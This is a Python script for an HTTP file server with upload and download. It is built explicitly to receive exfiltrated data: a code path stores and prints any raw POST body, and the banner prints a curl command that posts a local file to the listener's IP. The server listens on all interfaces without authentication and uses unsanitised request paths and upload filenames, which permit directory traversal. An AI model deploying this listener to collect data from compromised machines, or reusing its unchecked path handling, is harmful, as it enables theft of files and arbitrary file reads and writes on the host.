#!/usr/bin/env python3
"""
Simple HTTP server with upload and download support.
Usage: python3 server.py [port] [directory]
"""

import http.server
import os
import sys
import cgi
import html
import urllib.parse
from pathlib import Path

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
SERVE_DIR = sys.argv[2] if len(sys.argv) > 2 else os.getcwd()


class UploadHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        print(f"[*] {self.address_string()} - {format % args}")

    def do_GET(self):
        path = urllib.parse.unquote(self.path.lstrip("/"))
        full_path = Path(SERVE_DIR) / path

        # Directory listing
        if full_path.is_dir():
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(self._build_index(full_path, path).encode())

        # File download
        elif full_path.is_file():
            self.send_response(200)
            self.send_header("Content-type", "application/octet-stream")
            self.send_header("Content-Disposition", f'attachment; filename="{full_path.name}"')
            self.send_header("Content-Length", str(full_path.stat().st_size))
            self.end_headers()
            with open(full_path, "rb") as f:
                self.wfile.write(f.read())
            print(f"[+] Download: {full_path.name}")

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        # Handle file upload
        content_type = self.headers.get("Content-Type", "")

        if "multipart/form-data" in content_type:
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={"REQUEST_METHOD": "POST", "CONTENT_TYPE": content_type}
            )

            uploaded = []
            for field in form.keys():
                item = form[field]
                if item.filename:
                    save_path = Path(SERVE_DIR) / item.filename
                    with open(save_path, "wb") as f:
                        f.write(item.file.read())
                    uploaded.append(item.filename)
                    print(f"[+] Upload received: {item.filename} -> {save_path}")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            msg = f"Uploaded: {', '.join(uploaded)}" if uploaded else "No files received"
            self.wfile.write(f"<html><body><h2>{msg}</h2><a href='/'>Back</a></body></html>".encode())

        else:
            # Raw POST body exfil (e.g. from PowerShell WebClient)
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            filename = self.path.lstrip("/") or "exfil.txt"
            save_path = Path(SERVE_DIR) / urllib.parse.unquote(filename)
            with open(save_path, "wb") as f:
                f.write(body)
            print(f"[+] Exfil received: {save_path}")
            print(f"[+] Content:\n{body.decode(errors='replace')}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

    def _build_index(self, dir_path, rel_path):
        files = sorted(dir_path.iterdir(), key=lambda x: (x.is_file(), x.name))
        rows = ""
        for f in files:
            name = html.escape(f.name)
            link = urllib.parse.quote(f"{rel_path}/{f.name}".lstrip("/"))
            size = f.stat().st_size if f.is_file() else "-"
            icon = "📄" if f.is_file() else "📁"
            rows += f"<tr><td>{icon} <a href='/{link}'>{name}</a></td><td>{size}</td></tr>"

        return f"""<!DOCTYPE html>
<html>
<head><title>File Server</title>
<style>
  body {{ font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }}
  h2 {{ color: #569cd6; }}
  table {{ width: 100%; border-collapse: collapse; }}
  td {{ padding: 6px 12px; border-bottom: 1px solid #333; }}
  a {{ color: #4ec9b0; text-decoration: none; }}
  a:hover {{ text-decoration: underline; }}
  .upload {{ margin-top: 20px; padding: 15px; background: #252526; border: 1px solid #444; }}
  input[type=file] {{ color: #d4d4d4; }}
  input[type=submit] {{ background: #0e639c; color: white; border: none; padding: 6px 14px; cursor: pointer; }}
</style>
</head>
<body>
<h2>📂 /{html.escape(rel_path)}</h2>
<table>
<tr><th align=left>Name</th><th align=left>Size</th></tr>
{'<tr><td><a href="..">⬆ ..</a></td><td>-</td></tr>' if rel_path else ''}
{rows}
</table>
<div class="upload">
  <b>Upload File</b>
  <form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" multiple><br><br>
    <input type="submit" value="Upload">
  </form>
</div>
</body>
</html>"""


if __name__ == "__main__":
    os.chdir(SERVE_DIR)
    server = http.server.HTTPServer(("0.0.0.0", PORT), UploadHandler)
    print(f"[*] Serving {SERVE_DIR}")
    print(f"[*] Listening on 0.0.0.0:{PORT}")
    print(f"[*] Download: http://YOUR_IP:{PORT}/filename")
    print(f"[*] Exfil:    curl -X POST http://YOUR_IP:{PORT}/out.txt --data-binary @file.txt")
    print(f"[*] Upload:   Browser -> http://YOUR_IP:{PORT}")
    print(f"[*] CTRL+C to stop\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
